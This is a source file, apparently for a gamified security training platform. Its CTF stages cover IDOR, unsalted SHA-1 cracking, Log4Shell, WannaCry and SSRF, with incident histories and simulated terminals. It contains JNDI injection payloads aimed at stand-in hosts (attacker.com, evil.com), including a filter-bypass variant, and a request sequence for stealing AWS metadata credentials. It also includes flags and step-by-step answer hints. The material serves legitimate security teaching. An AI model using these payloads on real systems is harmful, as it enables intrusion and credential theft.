            ],
            solved: true,
          };
        },
      },
    },
  },

  // ─── Stage 6: Broken Access Control ──────────────────────────────────────
  {
    id: "stage-06",
    order: 6,
    title: "Broken Access Control",
    subtitle: "OWASP A01:2021 — IDOR & Privilege Escalation",
    category: "owasp",
    owaspRef: "A01:2021",
    cvssScore: 8.8,
    xp: 250,
    badge: { id: "badge-idor", name: "Access Granted", emoji: "🔓" },
    challengeType: "ctf",
    info: {
      tagline: "The #1 vulnerability in 2021: just change a number in the URL.",
      year: 2010,
      overview: [
        "Broken Access Control moved to #1 on the OWASP Top 10 in 2021, appearing in 94% of tested applications. It occurs when users can access functionality or data beyond their intended permissions — reading other users' records, escalating to admin, or accessing APIs without authentication.",
        "The most common variant is Insecure Direct Object Reference (IDOR): a server uses predictable identifiers (user IDs, document IDs, account numbers) in URLs or API calls, and fails to verify that the requesting user is authorized to access that specific object.",
        "Horizontal privilege escalation means accessing another user's data at the same privilege level (user A reading user B's records). Vertical privilege escalation means gaining higher privileges (a regular user accessing admin functions). Both are catastrophic in different ways.",
      ],
      technical: {
        title: "IDOR in Practice",
        body: [
          "A vulnerable API endpoint might look like GET /api/documents/2847. If the server returns the document without checking whether the logged-in user owns document 2847, an attacker can enumerate IDs: /api/documents/2846, /api/documents/1, etc.",
          "Fix: every access to an object must verify the requesting user's ownership or permission. This check must happen server-side — client-side checks (hidden fields, disabled buttons) are trivially bypassed.",
        ],
        codeExample: {
          label: "Vulnerable vs. secure API endpoint (Node.js)",
          code: `// VULNERABLE: no ownership check
app.get('/api/user/:id', async (req, res) => {
  const user = await db.findById(req.params.id);
  res.json(user); // returns ANY user's data!
});

// SECURE: verify ownership
app.get('/api/user/:id', async (req, res) => {
  if (req.session.userId !== req.params.id
      && !req.session.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const user = await db.findById(req.params.id);
  res.json(user);
});`,
        },
      },
      incident: {
        title: "AT&T iPad IDOR Breach (2010)",
        when: "June 2010",
        where: "AT&T ICC-ID API",
        impact: "114,000 iPad owners' emails exposed including military officers, senators, and CEOs",
        body: [
          "Security group Goatse Security discovered that AT&T's website used ICC-IDs (SIM card identifiers) as the sole authentication parameter for retrieving customer email addresses. The ICC-IDs were sequential and predictable. By simply incrementing the ID in the request, they could retrieve any customer's email address.",
          "Affected iPad owners included a NASA administrator, White House Chief of Staff, CEOs of major corporations, and numerous military and intelligence officials. The exposure of email addresses of government officials was considered a serious national security issue.",
          "AT&T patched the vulnerability within hours of being notified. The Goatse Security researchers were later arrested and charged with computer fraud — a controversial outcome that highlighted the legal risks of responsible disclosure.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "GET /user/1", type: "attacker" },
          { label: "API Endpoint", sub: "no auth check", type: "system" },
          { label: "Any User's Data", sub: "id=1 = admin", type: "victim" },
          { label: "Full Access", sub: "horizontal + vertical", type: "result" },
        ],
      },
      timeline: [
        { year: 2007, event: "IDOR first formally described in OWASP Testing Guide" },
        { year: 2010, event: "AT&T iPad breach — 114,000 records via predictable IDs", highlight: true },
        { year: 2018, event: "Facebook API IDOR exposes 50M user tokens" },
        { year: 2021, event: "Broken Access Control becomes #1 on OWASP Top 10" },
      ],
      keyTakeaways: [
        "Always verify server-side that the requesting user owns the requested resource",
        "Use UUIDs instead of sequential integers to make enumeration harder",
        "Implement deny-by-default: access is forbidden unless explicitly granted",
        "Client-side access control (hiding buttons) is not security",
      ],
      references: [
        { title: "OWASP A01:2021 — Broken Access Control", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
        { title: "OWASP: IDOR", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" },
        { title: "AT&T iPad Breach — Wired Report", url: "https://www.wired.com/2010/06/ipad-flaw/" },
      ],
    },
    ctf: {
      scenario: "You have access to a corporate API as a regular user. The API uses sequential user IDs. Find a way to access admin data.",
      hint: "Your user ID is 9284. What happens if you request /api/user/1 instead of /api/user/me?",
      hints: [
        "Read the README for API endpoint details. Run: cat README.txt",
        "Request your own profile first. Run: api GET /api/user/me",
        "User IDs are sequential integers starting at 1. Request the first user (admin). Run: api GET /api/user/1",
      ],
      flag: "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",
      files: {
        "/README.txt": [
          "TARGET: Corporate API — api.internal",
          "Your credentials: user_id=9284, token=eyJ...",
          "",
          "Commands:",
          "  api GET <path>   — make API request",
          "",
          "Known endpoints:",
          "  /api/user/me",
          "  /api/user/<id>",
          "  /api/documents/<id>",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        api: (args) => {
          const path = args[1] || "";
          if (path === "/api/user/me") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 9284, "name": "Agent", "role": "user", "email": "agent@corp.io" }',
              ],
            };
          }
          if (/\/api\/user\/(0|1)/.test(path) || path === "/api/admin") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 1, "name": "administrator", "role": "superadmin",',
                '  "secret": "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}" }',
              ],
              solved: true,
            };
          }
          if (/\/api\/user\/\d+/.test(path)) {
            const uid = path.split("/").pop();
            return {
              lines: [
                "HTTP/1.1 200 OK",
                `{ "id": ${uid}, "name": "user_${uid}", "role": "user" }`,
              ],
            };
          }
          return {
            lines: ["HTTP/1.1 404 Not Found", '{ "error": "Endpoint not found" }'],
          };
        },
      },
    },
  },

  // ─── Stage 7: Authentication Failures ────────────────────────────────────
  {
    id: "stage-07",
    order: 7,
    title: "Authentication Failures",
    subtitle: "OWASP A07:2021 — LinkedIn Breach (2012)",
    category: "owasp",
    owaspRef: "A07:2021",
    cvssScore: 9.8,
    xp: 300,
    badge: { id: "badge-cracker", name: "Hash Cracker", emoji: "🔑" },
    challengeType: "ctf",
    info: {
      tagline: "117 million passwords stolen because of one missing word: 'salt'.",
      year: 2012,
      overview: [
        "Authentication failures cover a wide range of vulnerabilities: weak passwords, unsalted password hashes, missing account lockout, insecure session tokens, and credential stuffing attacks. OWASP A07:2021 ranked this category third-highest risk in web application security.",
        "Password storage is a solved problem — yet companies continue to store passwords incorrectly. Hashing without salting is a critical mistake: an attacker with a leaked hash database can precompute a 'rainbow table' and reverse millions of hashes instantly. Adding a random salt per-user forces the attacker to crack each hash individually.",
        "Credential stuffing takes advantage of password reuse. When a site leaks credentials, attackers test those username/password pairs against every major service — banking, email, e-commerce. With 8+ billion credentials in circulation from past breaches, the success rate is surprisingly high.",
      ],
      technical: {
        title: "Hashing, Salting, and Why Both Matter",
        body: [
          "MD5 and SHA-1 are not password hashing algorithms — they are cryptographic hash functions designed for speed. A modern GPU can compute 10 billion SHA-1 hashes per second. A proper password hashing function (bcrypt, Argon2, scrypt) is intentionally slow — designed to take 100ms+ per hash, making brute force infeasible.",
          "A salt is a random value appended to the password before hashing. Even if two users have the same password, their salted hashes will differ — defeating rainbow table attacks. bcrypt, the most widely used algorithm, generates and stores the salt automatically.",
        ],
        codeExample: {
          label: "Insecure vs. secure password storage",
          code: `// INSECURE: unsalted MD5 (LinkedIn's mistake)
hash = md5("password123")
// → 482c811da5d5b4bc6d497ffa98491e38
// → Same hash for every user with "password123"
// → Instantly reversible via rainbow tables

// INSECURE: SHA-1 without salt
hash = sha1("password123")
// → cbfdac6008f9cab4083784cbd1874f76...
// → Crackable in seconds with modern hardware

// SECURE: bcrypt with auto-generated salt
hash = bcrypt.hash("password123", rounds=12)
// → $2b$12$xyz...  (includes salt in the output)
// → Takes ~100ms per check → brute force infeasible
// → Different hash even for same password`,
        },
      },
      incident: {
        title: "LinkedIn Password Breach (2012 / 2016)",
        when: "June 2012 (discovered); May 2016 (full scope revealed)",
        where: "LinkedIn — 117 million user accounts",
        impact: "117M SHA-1 unsalted password hashes leaked; sold on dark web for 5 Bitcoin (~$2,200)",
        body: [
          "In 2012, LinkedIn confirmed that 6.5 million password hashes had been leaked. They forced password resets and considered the matter closed. In 2016, the true scope emerged: 117 million credentials from the same 2012 breach were being sold on the dark web.",
          "LinkedIn had stored passwords as unsalted SHA-1 hashes. A hacker group on InsidePro forums cracked 90% of them within days using precomputed rainbow tables — because without salting, all users with 'password123' had identical hashes. The most common password in the leak was '123456' (753,305 accounts). 'linkedin' itself appeared 216,527 times.",
          "The breach enabled massive credential stuffing attacks against other services. Users who reused their LinkedIn password on banking or email sites found those accounts compromised too.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "obtains hash DB", type: "attacker" },
          { label: "Hash Database", sub: "unsalted SHA-1", type: "system" },
          { label: "Rainbow Table", sub: "precomputed", type: "victim" },
          { label: "117M Passwords", sub: "cracked instantly", type: "result" },
        ],
      },
      timeline: [
        { year: 2009, event: "RockYou breach: 32M passwords stored in plaintext" },
        { year: 2012, event: "LinkedIn: 117M SHA-1 unsalted hashes leaked", highlight: true },
        { year: 2013, event: "Adobe: 153M records with encrypted (not hashed) passwords" },
        { year: 2016, event: "Full LinkedIn dataset surfaces on dark web" },
        { year: 2021, event: "Have I Been Pwned reaches 11 billion pwned accounts" },
      ],
      keyTakeaways: [
        "Never use MD5 or SHA-1 for password hashing — use bcrypt, Argon2, or scrypt",
        "Always salt hashes; bcrypt does this automatically",
        "Implement account lockout or rate limiting to prevent brute force",
        "Encourage/enforce unique passwords via integration with HIBP",
      ],
      references: [
        { title: "OWASP A07:2021 — Auth Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
        { title: "Have I Been Pwned — LinkedIn", url: "https://haveibeenpwned.com/PwnedWebsites#LinkedIn" },
        { title: "OWASP: Password Storage Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" },
        { title: "Troy Hunt: The LinkedIn Breach", url: "https://www.troyhunt.com/observations-and-thoughts-on-the-linkedin-data-breach/" },
      ],
    },
    ctf: {
      scenario: "You've obtained a leaked hash database from a compromised server. The admin hash uses unsalted SHA-1. Use the wordlist to crack it.",
      hint: "Use hashcheck <word> to test each password from the wordlist against the admin hash.",
      hints: [
        "Read the README to understand the files. Run: cat README.txt",
        "Check the admin's hash. Run: cat admin_hash.txt",
        "Read the wordlist to see passwords to try. Run: cat wordlist.txt",
        "Test each password from the wordlist. Try common ones: hashcheck password  then  hashcheck 123456",
        "The password is a common English word. Try: hashcheck letmein",
        "Once you crack it, log in: login admin letmein",
      ],
      flag: "FLAG{W34K_H4SH_CR4CK3D}",
      files: {
        "/README.txt": [
          "LEAKED HASH DATABASE",
          "====================",
          "",
          "admin_hash.txt  — admin's SHA-1 password hash",
          "wordlist.txt    — common passwords to try",
          "",
          "Commands:",
          "  hashcheck <word>   — test if word matches admin hash",
          "  login <user> <pass> — login once you crack it",
        ].join("\n"),
        "/admin_hash.txt": [
          "Username: admin",
          "Hash (SHA-1, unsalted): 0d107d09f5bbe40cade3de5c71e9e9b7",
          "",
          "NOTE: This is the SHA-1 hash of a common English word.",
        ].join("\n"),
        "/wordlist.txt": [
          "Top passwords from RockYou breach:",
          "123456",
          "password",
          "12345678",
          "qwerty",
          "letmein",
          "dragon",
          "master",
          "sunshine",
          "princess",
          "welcome",
          "shadow",
          "superman",
          "michael",
          "football",
          "iloveyou",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "admin_hash.txt", isDir: false },
          { name: "wordlist.txt", isDir: false },
        ],
      },
      extraCommands: {
        // SHA-1 of "letmein" = 0d107d09f5bbe40cade3de5c71e9e9b7
        hashcheck: (args) => {
          const word = args[0] || "";
          if (word === "letmein") {
            return {
              lines: [
                `Testing: "${word}"`,
                "Computing SHA-1...",
                "SHA-1(letmein) = 0d107d09f5bbe40cade3de5c71e9e9b7",
                "✓ MATCH! Password cracked: letmein",
                "",
                'Now use: login admin letmein',
              ],
            };
          }
          return {
            lines: [`Testing: "${word}"`, `SHA-1(${word}) ≠ 0d107d09f5bbe40cade3de5c71e9e9b7`, "No match."],
          };
        },
        login: (args) => {
          const [user, pass] = args;
          if (user === "admin" && pass === "letmein") {
            return {
              lines: [
                "Authentication successful!",
                "Welcome, admin.",
                "",
                "Admin panel secret: FLAG{W34K_H4SH_CR4CK3D}",
              ],
              solved: true,
            };
          }
          return { lines: ["Login failed."] };
        },
      },
    },
  },

  // ─── Stage 8: Log4Shell ───────────────────────────────────────────────────
  {
    id: "stage-08",
    order: 8,
    title: "Log4Shell",
    subtitle: "CVE-2021-44228 — CVSS 10.0 Critical",
    category: "owasp",
    cveId: "CVE-2021-44228",
    cvssScore: 10.0,
    xp: 350,
    badge: { id: "badge-log4shell", name: "JNDI Hunter", emoji: "💣" },
    challengeType: "ctf",
    info: {
      tagline: "One log line. Every Java server on the internet. CVSS 10.0.",
      year: 2021,
      overview: [
        "Log4Shell (CVE-2021-44228) was disclosed on December 9, 2021 and assigned the maximum CVSS score of 10.0. It affected Apache Log4j2, the most widely used Java logging library in the world — embedded in everything from enterprise applications to game servers to industrial control systems.",
        "The vulnerability allowed unauthenticated remote code execution via a single string logged by the application. Because Log4j2 supports 'Message Lookup Substitution', any logged text containing ${jndi:ldap://attacker.com/exploit} would trigger Log4j to make an LDAP request to the attacker's server, fetching and executing a Java class.",
        "The attack surface was enormous: username fields, HTTP headers, search queries, form inputs — any string that gets logged. Within 12 hours of disclosure, millions of automated exploit attempts were detected globally. Security teams worldwide had to inventory every Java application in their stack, often with no central record of where Log4j was used.",
      ],
      technical: {
        title: "JNDI Injection — How Log4Shell Works",
        body: [
          "Log4j2's Message Lookup Substitution feature evaluates expressions embedded in log messages. When a message like User login: ${jndi:ldap://attacker.com/a} is logged, Log4j resolves the JNDI (Java Naming and Directory Interface) lookup by connecting to attacker.com:389.",
          "The attacker's LDAP server returns a reference to a remote Java class. Log4j downloads and instantiates the class, executing its constructor — arbitrary code running with the JVM's permissions. The fix in Log4j 2.15.0 disabled JNDI lookups by default.",
        ],
        codeExample: {
          label: "Log4Shell attack — the payload and what happens",
          code: `# The attack payload (can appear in any logged field):
User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}
# Or in a login form:
username: \${jndi:ldap://evil.com/a}
# Or even nested to bypass filters:
username: \${j\${::-n}di:ldap://evil.com/a}

# What Log4j does:
1. Receives string containing \${jndi:ldap://...}
2. Resolves JNDI lookup → connects to attacker's LDAP
3. LDAP server returns: "load this Java class from http://evil.com/Exploit.class"
4. Log4j downloads and executes Exploit.class
5. Attacker has RCE — game over`,
        },
      },
      incident: {
        title: "Log4Shell — December 2021",
        when: "December 9, 2021 (patch day); exploited same day",
        where: "Virtually every Java application globally — Apple, Amazon, Google, Cloudflare, Tesla",
        impact: "Tens of thousands of servers compromised; ransomware, cryptomining, and nation-state espionage",
        body: [
          "Chen Zhaojun of Alibaba Cloud Security Team reported the vulnerability to Apache on November 24, 2021. Apache released Log4j 2.15.0 on December 9, 2021 — the same day it became public knowledge via a tweet and a Minecraft server security post.",
          "Within hours, Cloudflare reported blocking 40,000 exploit attempts per minute. The Belgian Defence Ministry was compromised. Conti ransomware group added Log4Shell to their toolkit within days. The US CISA Director Jen Easterly called it 'the most serious vulnerability I have seen in my decades-long career'.",
          "The remediation challenge was immense: Log4j is a transitive dependency, often buried 5+ levels deep in dependency trees. Many organizations didn't know they were running vulnerable versions. The vulnerability continued to affect unpatched systems for years.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "${jndi:ldap://evil}", type: "attacker" },
          { label: "Log4j2 Logger", sub: "evaluates expression", type: "system" },
          { label: "JNDI → Remote Class", sub: "arbitrary Java loaded", type: "victim" },
          { label: "RCE Achieved", sub: "CVSS 10.0", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "Log4j2 released — JNDI lookup feature included" },
        { year: 2021, event: "Nov 24: Chen Zhaojun reports to Apache" },
        { year: 2021, event: "Dec 9: Log4j 2.15.0 released; exploit goes public", highlight: true },
        { year: 2021, event: "Dec 10: 40,000 exploit attempts/minute blocked by Cloudflare" },
        { year: 2022, event: "Log4Shell still actively exploited; CISA mandates federal patching" },
      ],
      keyTakeaways: [
        "Log4Shell shows that logging libraries are security-critical code",
        "JNDI lookups in log messages should have been disabled by default",
        "Know your full dependency tree — transitive dependencies matter",
        "Any user-controlled string that gets logged is an attack surface",
      ],
      references: [
        { title: "CVE-2021-44228 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
        { title: "Apache Log4j Security Advisory", url: "https://logging.apache.org/log4j/2.x/security.html" },
        { title: "CISA Log4j Guidance", url: "https://www.cisa.gov/news-events/news/statement-director-easterly-log4j-vulnerability" },
        { title: "LunaSec Log4Shell Deep Dive", url: "https://www.lunasec.io/docs/blog/log4j-zero-day/" },
      ],
    },
    ctf: {
      scenario: "A Java application is logging all user input. The server runs Log4j2 2.14.1. Craft a JNDI payload to trigger remote code execution.",
      hint: "Log4j evaluates ${} expressions in log messages. JNDI supports ldap:// protocol lookups.",
      hints: [
        "Check the vulnerable dependencies. Run: check-deps",
        "Try logging a normal message to see how it works. Run: log hello world",
        "Log4j evaluates expressions like ${env:PATH} in log messages. Try: log ${env:HOSTNAME}",
        "JNDI is a Java API for network lookups. Embed a JNDI payload in a logged string. Try: log ${jndi:ldap://attacker.com/a}",
      ],
      flag: "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
      files: {
        "/README.txt": [
          "TARGET: Java web app at app.internal:8080",
          "Log4j version: 2.14.1 (vulnerable to CVE-2021-44228)",
          "",
          "Commands:",
          "  log <message>         — send a message to be logged",
          "  check-deps            — show dependencies",
        ].join("\n"),
        "/dependencies.txt": [
          "Project dependencies:",
          "  org.apache.logging.log4j:log4j-core:2.14.1  ← VULNERABLE",
          "  org.apache.logging.log4j:log4j-api:2.14.1   ← VULNERABLE",
          "  spring-boot:2.5.6",
          "  jackson-databind:2.13.0",
          "",
          "Fixed version: log4j-core:2.15.0+",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "dependencies.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-deps": () => ({
          lines: [
            "log4j-core:2.14.1 — VULNERABLE (CVE-2021-44228)",
            "log4j-api:2.14.1  — VULNERABLE",
            "Status: UNPATCHED",
          ],
        }),
        log: (args) => {
          const msg = args.join(" ");
          const isJndi =
            msg.includes("${jndi:") ||
            msg.includes("${jndi:ldap") ||
            msg.toLowerCase().includes("jndi");
          if (isJndi) {
            return {
              lines: [
                `[INFO ] Logging: ${msg}`,
                "[INFO ] Processing JNDI lookup...",
                "[WARN ] Establishing LDAP connection to attacker server",
                "[WARN ] Loading remote class: com.attacker.Exploit",
                "[ERROR] Remote class execution detected!",
                "",
                "SYSTEM COMPROMISED",
                "Running as: tomcat (uid=1000)",
                "",
                "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
              ],
              solved: true,
            };
          }
          return {
            lines: [`[INFO ] ${new Date().toISOString()} — ${msg || "(empty message)"}`],
          };
        },
      },
    },
  },

  // ─── Stage 9: WannaCry / EternalBlue ─────────────────────────────────────
  {
    id: "stage-09",
    order: 9,
    title: "WannaCry / EternalBlue",
    subtitle: "CVE-2017-0144 — NSA Exploit Goes Rogue",
    category: "owasp",
    cveId: "CVE-2017-0144",
    cvssScore: 8.1,
    xp: 350,
    badge: { id: "badge-wannacry", name: "Ransomware Hunter", emoji: "💀" },
    challengeType: "ctf",
    info: {
      tagline: "An NSA cyberweapon leaked on a Friday. By Monday, the NHS was crippled.",
      year: 2017,
      overview: [
        "WannaCry was a ransomware cryptoworm that tore across 150 countries on May 12, 2017, infecting over 200,000 systems in a single day. It exploited EternalBlue (CVE-2017-0144), a vulnerability in Windows' SMBv1 protocol originally developed by the NSA and stolen and leaked by a group called Shadow Brokers.",
        "Unlike traditional ransomware that requires a user to click something, WannaCry spread autonomously across networks by scanning for vulnerable SMBv1 servers on port 445. Once on a system, it encrypted files and demanded $300–600 in Bitcoin. The self-spreading 'worm' capability turned a ransomware attack into a global catastrophe.",
        "The attack was eventually slowed when security researcher Marcus Hutchins accidentally discovered a kill switch: WannaCry checked whether a long, nonsensical domain name was registered before executing. By registering the domain for $10.69, Hutchins triggered the kill switch and stopped new infections globally.",
      ],
      technical: {
        title: "How EternalBlue Works",
        body: [
          "SMBv1 (Server Message Block v1) is a decades-old Windows file-sharing protocol. EternalBlue exploited a buffer overflow in the way Windows' SMB implementation handled certain transaction requests, allowing arbitrary code execution without authentication.",
          "Microsoft patched this as MS17-010 on March 14, 2017 — two months before WannaCry. However, countless systems (particularly in healthcare and critical infrastructure) had not applied the patch. Windows XP, still in widespread use in hospitals, never received a patch at all.",
        ],
        codeExample: {
          label: "WannaCry propagation logic (pseudocode)",
          code: `// WannaCry worm loop — runs continuously
while (true) {
  targets = scan_random_ips(port=445)  // SMBv1

  for target in targets:
    try:
      // EternalBlue SMBv1 exploit
      send_malformed_transaction(target)
      // If successful → code executes on target

      // Install DoublePulsar backdoor kernel implant
      install_backdoor(target)

      // Drop WannaCry ransomware via backdoor
      execute_ransomware(target)

      // Encrypt files: *.doc, *.pdf, *.jpg, etc.
      // Demand $300 Bitcoin ransom
    except: pass
}`,
        },
      },
      incident: {
        title: "WannaCry — May 12, 2017",
        when: "May 12–15, 2017",
        where: "150 countries; NHS UK, FedEx, Deutsche Bahn, Telefónica, Russian Interior Ministry",
        impact: "Over 200,000 systems; NHS cancelled 19,000 medical appointments; estimated $4–8 billion in damages",
        body: [
          "The NHS (UK National Health Service) was among the hardest hit. Hospitals locked doctors out of patient records, cancelled surgeries, and diverted ambulances. Patients were turned away from emergency rooms. The attack exposed that NHS trusts were running Windows XP — an operating system Microsoft had stopped supporting in 2014.",
          "Marcus Hutchins, a 22-year-old security researcher, noticed that WannaCry was querying a nonsensical domain name before executing. He registered the domain for $10.69, causing WannaCry to believe it was in a sandbox environment and halt its spread globally — a kill switch the malware authors never expected to be activated.",
          "The US, UK, and Australia formally attributed WannaCry to North Korea's Lazarus Group in December 2017. The NSA faced significant criticism for hoarding the EternalBlue vulnerability for offensive use rather than disclosing it to Microsoft.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NSA EternalBlue", sub: "leaked by Shadow Brokers", type: "attacker" },
          { label: "SMBv1 Port 445", sub: "CVE-2017-0144", type: "system" },
          { label: "Unpatched Windows", sub: "200,000+ systems", type: "victim" },
          { label: "Files Encrypted", sub: "$300 ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "Apr 14: Shadow Brokers leak NSA EternalBlue exploit" },
        { year: 2017, event: "Mar 14: Microsoft releases MS17-010 patch (before leak)" },
        { year: 2017, event: "May 12: WannaCry spreads across 150 countries in one day", highlight: true },
        { year: 2017, event: "May 12: Marcus Hutchins registers kill switch domain" },
        { year: 2017, event: "Dec: US/UK attribute attack to North Korea Lazarus Group" },
      ],
      keyTakeaways: [
        "Patch Tuesday patches are critical — MS17-010 was available before WannaCry",
        "Legacy operating systems (Windows XP) in critical infrastructure are existential risks",
        "Government-developed cyberweapons can be stolen and weaponized",
        "Kill switches in malware can be unintentional — always analyze before deploying",
      ],
      references: [
        { title: "CVE-2017-0144 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144" },
        { title: "Microsoft MS17-010 Security Bulletin", url: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" },
        { title: "Marcus Hutchins: How I Accidentally Stopped WannaCry", url: "https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" },
        { title: "US DOJ Attribution — North Korea", url: "https://www.justice.gov/opa/pr/north-korean-regime-backed-programmer-charged-conspiracy-conduct-multiple-cyber-attacks-and" },
      ],
    },
    ctf: {
      scenario: "You're analyzing a network capture from a hospital that was hit by WannaCry. Identify the attack vector and extract the signature from the malicious SMB traffic.",
      hint: "Start with netstat to see active connections, then analyze the suspicious port.",
      hints: [
        "Read the incident report. Run: cat README.txt",
        "Check active network connections. Run: netstat",
        "You'll see many connections to port 445 (SMB). Read the traffic capture. Run: cat capture/traffic.txt",
        "Analyze the SMB traffic on port 445 to find the exploit signature. Run: analyze port 445",
      ],
      flag: "FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
      files: {
        "/README.txt": [
          "INCIDENT RESPONSE — Hospital Network",
          "=====================================",
          "Date: 2017-05-12  Time: 09:42 UTC",
          "",
          "Multiple workstations showing encrypted files.",
          "Ransom note: '@Please_Read_Me@.txt'",
          "",
          "Commands:",
          "  netstat             — show network connections",
          "  analyze <target>    — analyze traffic",
          "  decode <hex>        — decode hex payload",
        ].join("\n"),
        "/capture/traffic.txt": [
          "Packet capture summary:",
          "10.0.1.5:52034  →  10.0.1.*:445   [SMBv1 NBSS]",
          "10.0.1.5:52035  →  10.0.1.*:445   [EXPLOIT ATTEMPT]",
          "10.0.1.12:445   ←  10.0.1.5       [SHELL OPENED]",
          "10.0.1.12:445   ←  10.0.1.5       [RANSOMWARE DROPPED]",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "capture", isDir: true },
        ],
        "/capture": [{ name: "traffic.txt", isDir: false }],
      },
      extraCommands: {
        netstat: () => ({
          lines: [
            "Active connections:",
            "  10.0.1.5:52034  →  10.0.1.12:445  ESTABLISHED  [smb.exe]",
            "  10.0.1.5:52035  →  10.0.1.19:445  SYN_SENT",
            "  10.0.1.5:52036  →  10.0.1.22:445  SYN_SENT",
            "  0.0.0.0:445     LISTENING          [System]",
            "",
            "Suspicious: multiple outbound connections to port 445",
          ],
        }),
        analyze: (args) => {
          const t = args.join(" ").toLowerCase();
          if (t.includes("445") || t.includes("smb") || t.includes("traffic") || t.includes("port")) {
            return {
              lines: [
                "Analyzing SMB traffic on port 445...",
                "",
                "Packet #1342: EternalBlue exploit attempt",
                "  CVE-2017-0144 (MS17-010) signature detected",
                "  Malformed SMB_COM_TRANSACTION2 request",
                "  Overflow in SetupCount field",
                "",
                "Packet #1343: DoublePulsar backdoor installed",
                "  Kernel implant confirmed at 10.0.1.12",
                "",
                "Packet #1344: WannaCry ransomware payload",
                "  Encrypted payload in SMB stream",
                "  Decoding... FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `No specific analysis for "${args.join(" ")}"`,
              "Try: analyze port 445, analyze smb, or analyze traffic",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 10: SSRF ───────────────────────────────────────────────────────
  {
    id: "stage-10",
    order: 10,
    title: "Server-Side Request Forgery",
    subtitle: "OWASP A10:2021 — Capital One Breach (2019)",
    category: "owasp",
    owaspRef: "A10:2021",
    cvssScore: 8.6,
    xp: 400,
    badge: { id: "badge-ssrf", name: "Metadata Miner", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Make the server fetch its own secrets from the cloud metadata service.",
      year: 2019,
      overview: [
        "Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or other systems unreachable from the internet. It entered the OWASP Top 10 for the first time in 2021 (A10) due to rapidly increasing prevalence in cloud environments.",
        "In cloud infrastructure, the most lucrative SSRF target is the instance metadata service — a non-routable HTTP endpoint (169.254.169.254) that provides configuration data, IAM role credentials, and secret tokens to EC2 instances. These credentials can then be used to access S3 buckets, RDS databases, and other cloud services.",
        "SSRF is particularly dangerous in modern microservice architectures where internal services assume trust without authentication. A single externally-reachable SSRF vulnerability can give an attacker access to the entire internal service mesh.",
      ],
      technical: {
        title: "AWS Metadata Service SSRF",
        body: [
          "AWS IMDSv1 (Instance Metadata Service version 1) is an unauthenticated HTTP service running on every EC2 instance at 169.254.169.254. Any code running on the instance can query it to retrieve IAM role credentials, instance identity, and other sensitive data.",
          "IMDSv2 (released November 2019, after the Capital One breach) added token-based authentication, requiring a preliminary PUT request. This breaks most SSRF exploits that simply forge GET requests to the metadata service. However, many instances still run IMDSv1.",
        ],
        codeExample: {
          label: "SSRF to steal AWS IAM credentials",
          code: `# Application has a URL-fetching feature:
POST /api/preview
{ "url": "https://legitimate-site.com/image.jpg" }

# Attacker sends internal metadata URL instead:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/" }

# Server responds with role name: "my-ec2-role"

# Second request to get the actual credentials:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/my-ec2-role" }

# Response: AccessKeyId, SecretAccessKey, SessionToken
# Attacker now has full AWS API access as that role`,
        },
      },
      incident: {
        title: "Capital One Breach (2019)",
        when: "March–July 2019",
        where: "Capital One Financial Corporation — AWS infrastructure",
        impact: "106 million customer records; 140,000 SSNs; 80,000 bank account numbers",
        body: [
          "Paige Thompson, a former AWS software engineer, exploited a misconfigured WAF (Web Application Firewall) on Capital One's AWS infrastructure. The WAF was configured to allow SSRF requests to pass through, enabling Thompson to query the EC2 metadata service from within the firewall.",
          "By requesting http://169.254.169.254/latest/meta-data/iam/security-credentials/, she retrieved temporary AWS IAM role credentials. Using those credentials, she listed and downloaded over 700 S3 buckets containing six years of Capital One customer data.",
          "Thompson was arrested on July 29, 2019, after posting about the breach on GitHub and Slack. Capital One was fined $80 million by the OCC and settled a class action lawsuit for $190 million. The breach highlighted that cloud security requires explicit configuration — migrating to the cloud does not inherit traditional perimeter security.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "url=169.254.169.254", type: "attacker" },
          { label: "Web App (WAF)", sub: "forwards request", type: "system" },
          { label: "EC2 Metadata", sub: "returns IAM creds", type: "victim" },
          { label: "106M Records", sub: "S3 buckets accessed", type: "result" },
        ],
      },
      timeline: [
